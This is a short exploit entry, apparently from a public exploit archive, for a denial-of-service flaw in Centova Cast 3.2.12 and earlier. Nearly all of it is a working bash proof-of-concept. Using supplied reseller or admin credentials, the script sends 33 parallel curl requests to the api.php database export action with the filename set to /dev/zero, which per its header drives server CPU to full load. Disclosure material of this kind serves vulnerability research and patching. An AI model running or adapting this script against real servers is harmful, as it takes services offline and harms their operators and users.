# Exploit Title: Centova Cast 3.2.12 - Denial of Service (PoC)
# Date: 2019-11-18
# Exploit Author: DroidU
# Vendor Homepage: https://centova.com
# Affected Version: <=v3.2.12
# Tested on: Debian 9, CentOS 7
# ===============================================
# The Centova Cast becomes out of control and causes 100% CPU load on all cores.

#!/bin/bash
if [ "$3" = "" ]
then
echo "Usage: $0 centovacast_url reseller/admin password"
exit
fi
url=$1
reseller=$2
pass=$3


dwn() {
echo -n .
curl -s -k --connect-timeout 5 -m 5 "$url/api.php?xm=system.database&f=json&a\[username\]=&a\[password\]=$reseller|$pass&a\[action\]=export&a\[filename\]=/dev/zero" &
}

for i in {0..32}
do
dwn /dev/zero
sleep .1
done
echo "
Done!"